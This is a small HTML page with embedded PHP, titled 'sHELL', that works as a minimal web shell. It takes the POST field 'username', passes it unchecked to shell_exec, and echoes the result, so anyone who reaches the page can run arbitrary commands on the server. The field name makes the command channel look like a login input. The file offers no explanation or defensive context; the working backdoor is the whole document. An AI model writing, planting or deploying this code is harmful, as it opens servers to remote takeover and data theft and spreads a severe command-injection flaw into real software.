<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>sHELL</title>
</head>
<body>
    <div class="responsediv">
    <h1 class="respose">
        <?php
            
            $uname = $_POST['username'];
            $result_code = shell_exec($uname);
            echo ($result_code);
            if($result_code==null)
            {echo"invalid code"; 
                die; }
        ?>
    </h1>
    </div>
    
</body>
</html>

